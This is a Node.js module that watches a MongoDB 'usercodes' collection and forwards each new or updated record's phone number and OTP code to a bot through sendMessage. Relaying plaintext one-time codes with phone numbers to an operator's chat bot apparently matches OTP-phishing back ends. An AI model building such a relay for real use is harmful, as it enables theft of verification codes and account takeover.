const mongoose = require('mongoose');
const config = require('../config');
const { sendMessage } = require('../bot');
const { log } = require('../utils');

let changeStream;

const connectDB = async () => {
  try {
    await mongoose.connect(config.mongoDBUrl);
    console.log('MongoDB connected successfully.');

    mongoose.connection.on('error', (error) => {
      console.error('MongoDB connection error:', error);
      log(`MongoDB connection error: ${error}`);
      setTimeout(connectDB, 5000); // Reconnect after 5 seconds
    });

    listenForChanges();
  } catch (error) {
    console.error('MongoDB connection error:', error);
    log(`MongoDB connection error: ${error}`);
    process.exit(1); // Exit the application if the connection fails
  }
};

const listenForChanges = () => {
  const collection = mongoose.connection.collection('usercodes');

  const startChangeStream = () => {
    const pipeline = [{ $match: { operationType: { $in: ['insert', 'update'] } } }];
    const options = { fullDocument: 'updateLookup' };

    changeStream = collection.watch(pipeline, options);

    changeStream.on('change', async (change) => {
      console.log('Change detected:', change.operationType);
      try {
        if (change.operationType === 'insert') {
          const insertedDocument = change.fullDocument;
          const message = `New document inserted:
- ID: ${insertedDocument._id}
- Phone: ${insertedDocument.phoneNumber || 'N/A'}
- OTP: ${insertedDocument.otpCode || 'N/A'}`;
          sendMessage(message);
        } else if (change.operationType === 'update') {
          const documentId = change.documentKey._id;
          const updatedDocument = await collection.findOne({ _id: documentId });
          const message = `New document updated:
- ID: ${updatedDocument._id}
- Phone: ${updatedDocument.phoneNumber || 'N/A'}
- OTP: ${updatedDocument.otpCode || 'N/A'}`;
          sendMessage(message);
        }
      } catch (error) {
        console.error('Error processing change:', error);
        log(`Error processing change: ${error}`);
      }
    });

    changeStream.on('error', (error) => {
      console.error('Change Stream error:', error);
      log(`Change Stream error: ${error}`);
      setTimeout(startChangeStream, 5000); // Restart after 5 seconds
    });

    changeStream.on('end', () => {
      console.log('Change Stream ended. Restarting...');
      startChangeStream(); // Restart if the stream ends
    });
  };

  startChangeStream();
};

process.on('SIGINT', () => {
  if (changeStream) {
    changeStream.close();
    console.log('Change Stream closed.');
  }
  mongoose.connection.close();
  console.log('MongoDB connection closed.');
  process.exit(0);
});

process.on('unhandledRejection', (error) => {
  console.error('Unhandled promise rejection:', error);
  log(`Unhandled promise rejection: ${error}`);
});

module.exports = connectDB;